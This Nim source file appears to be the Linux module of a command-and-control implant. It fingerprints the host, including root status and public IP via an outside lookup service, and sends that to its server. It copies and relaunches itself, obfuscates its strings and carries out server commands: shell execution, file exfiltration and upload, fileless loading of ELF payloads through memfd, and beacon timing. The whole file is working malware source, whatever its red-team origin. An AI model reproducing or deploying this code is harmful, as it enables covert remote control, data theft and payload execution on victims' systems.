# Internal imports
import ../config
import ../common
import utils/[memfd]
# External imports
import std/[tables, nativesockets, json]
import system/[io]
import httpclient
import nimprotect
import strformat
import strutils
import osproc
import posix
import crc32
import net
import os

# Core functions
proc linux_start*(): void
proc linux_parse_command*(command: JsonNode): bool

# Command executors
proc collect_data(): bool
proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bool

# Helpers
proc get_linux_agent_id*(): string

# Globals
let client = newHttpClient(userAgent=get_linux_agent_id())


#########################
### Command executors ###
#########################

proc collect_data(): bool =
    var is_success: bool
    var hostname: string
    var os_version: string
    var process: string
    var username: string
    var is_admin: string
    var is_elevated: string
    var ipv4_local: string
    var ipv4_public: string

    try:
        hostname = getHostname()
    except:
        hostname = could_not_retrieve
    try:    
        for i in readFile(protectString("/etc/os-release")).split("\n"):
            if contains(i, protectString("PRETTY_NAME")):
                os_version = i.split("\"")[1]
    except:
        os_version = could_not_retrieve      
    try:    
        process = fmt"[{$getCurrentProcessId()}] {getAppFilename()}"
    except:
        process = could_not_retrieve
    try:
        let pw = getpwuid(geteuid())
        username = if pw != nil: $pw.pw_name else: could_not_retrieve
    except:
        username = could_not_retrieve
    try:
        if geteuid() == 0:
            is_elevated = protectString("True")
            is_admin = protectString("True")
        else:
            is_elevated = protectString("False")
            if getuid() == 0:
                is_admin = protectString("True")
            else:
                is_admin = protectString("False")
    except:
        is_admin = could_not_retrieve
        is_elevated = could_not_retrieve

    try:
        ipv4_local = $getPrimaryIPAddr()
    except:
        ipv4_local = could_not_retrieve
    try:
        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
    except:
        ipv4_public = could_not_retrieve
    
    var data = {

        protectString("Hostname"): hostname,
        protectString("OS Version"): os_version,
        protectString("Process"): process,
        protectString("Username"): username, 
        protectString("Admin"): is_admin, 
        protectString("Elevated"): is_elevated, 
        protectString("IPV4 Local"): ipv4_local, 
        protectString("IPV4 Public"): ipv4_public
    
    }.toOrderedTable()

    is_success = post_data(client, protectString("collect") , $data)

    return is_success


proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bool =
    var is_success: bool
    var is_task: bool
    var output: string
    
    case mode:
        of protectString("implant"):
            is_task = false
        of protectString("task"):
            is_task = true
        else:
            return false
    
    (is_success, output) = load_memfd(elf_base64, command_line, is_task)

    var data = {
        protectString("mode"): mode,
        protectString("command_line"): command_line,
        protectString("is_success"): $is_success
    }.toOrderedTable()
    
    if output.len() > 0:
        data[protectString("output")] = output

    is_success = post_data(client, protectString("memfd"), $data)

    return is_success


#########################
######## Helpers ########
#########################

proc get_linux_agent_id*(): string =
    var machine_id = readFile(protectString("/etc/machine-id"))
    var user_agent = machine_id
    crc32(user_agent)
    return user_agent.toLower()
    

##########################
##### Core functions #####
##########################

proc linux_start*(): void =
    sleep(sleep_on_execution * 1000)
    let binary_path = getAppFilename()
    if is_exe and reloc_on_exec_linux and (binary_path != agent_execution_path_linux):
        var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
        createDir(agent_execution_dir)
        copyFile(binary_path, agent_execution_path_linux)
        setFilePermissions(agent_execution_path_linux, {fpUserExec})
        discard startProcess(agent_execution_path_linux, options={})
        quit()
    else:
        discard collect_data()


proc linux_parse_command*(command: JsonNode): bool =
    var is_success: bool
    var command_type = command[protectString("command_type")].getStr()
    case command_type:
        of protectString("cmd"):
            is_success = run_shell_command(client, command[protectString(protectString("shell_command"))].getStr())
        of protectString("download"):
            is_success = exfil_file(client, command[protectString("src_file")].getStr())
        of protectString("upload"):
            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr()) 
        of protectString("memfd"):
            is_success = wrap_load_memfd(command[protectString("elf_file_data_base64")].getStr(), command[protectString("command_line")].getStr(), command[protectString("mode")].getStr())
        of protectString("sleep"):
            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
        of protectString("collect"):
            is_success = collect_data()
        of protectString("die"):
            die(client)

        else:
            is_success = false
    return is_success
